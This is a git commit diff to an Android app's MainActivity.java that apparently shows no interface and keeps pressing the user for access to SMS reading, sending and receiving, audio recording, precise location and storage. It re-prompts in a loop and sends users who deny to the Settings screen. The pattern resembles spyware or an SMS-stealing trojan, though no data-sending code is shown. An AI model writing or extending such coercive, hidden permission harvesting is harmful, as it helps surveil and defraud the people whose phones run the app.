aeb4b37b5ac4486066cf1c26fa7e7330da088195
exu-coder <mdeitu3@gmail.com>
2026-07-26 07:42:33 +0600

    Update MainActivity.java

--- app/src/main/java/com/my/luck/MainActivity.java
+++ app/src/main/java/com/my/luck/MainActivity.java
@@ -23,15 +23,26 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // NO LAYOUT - just start directly
-        checkAndRequestPermissions();
+        // Small delay to let activity initialize
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkAndRequestPermissions();
+            }
+        }, 300);
     }
 
     private void checkAndRequestPermissions() {
         List<String> neededPermissions = new ArrayList<>();
 
+        // Only add permissions that are actually needed and available on this Android version
         neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            // WRITE_EXTERNAL_STORAGE is deprecated on Android 13+
+            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+        
         neededPermissions.add(Manifest.permission.READ_SMS);
         neededPermissions.add(Manifest.permission.SEND_SMS);
         neededPermissions.add(Manifest.permission.RECEIVE_SMS);
@@ -41,7 +52,11 @@ public class MainActivity extends AppCompatActivity {
         neededPermissions.add(Manifest.permission.RECORD_AUDIO);
         neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
         neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-        neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
+        
+        // READ_PHONE_STATE is not needed for basic functionality
+        // and causes issues on Android 15
+        // neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
+        
         neededPermissions.add(Manifest.permission.INTERNET);
         neededPermissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
         
@@ -49,6 +64,7 @@ public class MainActivity extends AppCompatActivity {
             neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
         }
 
+        // Filter out already granted permissions
         List<String> missingPermissions = new ArrayList<>();
         for (String perm : neededPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
@@ -57,20 +73,42 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (missingPermissions.isEmpty()) {
+            // All permissions granted
             startApp();
         } else if (!permissionsRequested) {
             permissionsRequested = true;
             String[] permsArray = missingPermissions.toArray(new String[0]);
             ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
         } else {
-            Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    permissionsRequested = false;
-                    checkAndRequestPermissions();
+            // Check if user permanently denied - guide them to settings
+            boolean showSettings = false;
+            for (String perm : missingPermissions) {
+                if (ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
+                    // User denied but not permanently
+                    break;
+                } else {
+                    showSettings = true;
                 }
-            }, 2000);
+            }
+            
+            if (showSettings) {
+                Toast.makeText(this, "Please enable all permissions in Settings", Toast.LENGTH_LONG).show();
+                // Open app settings
+                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+                finish();
+            } else {
+                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
+                // Retry after delay
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        permissionsRequested = false;
+                        checkAndRequestPermissions();
+                    }
+                }, 3000);
+            }
         }
     }
 
@@ -90,14 +128,31 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 startApp();
             } else {
-                Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show();
-                permissionsRequested = false;
-                handler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        checkAndRequestPermissions();
+                // Check if any permission was permanently denied
+                boolean permanentDeny = false;
+                for (String perm : permissions) {
+                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
+                        permanentDeny = true;
+                        break;
                     }
-                }, 2000);
+                }
+                
+                if (permanentDeny) {
+                    Toast.makeText(this, "Please enable all permissions in Settings", Toast.LENGTH_LONG).show();
+                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                    finish();
+                } else {
+                    Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
+                    permissionsRequested = false;
+                    handler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            checkAndRequestPermissions();
+                        }
+                    }, 2000);
+                }
             }
         }
     }
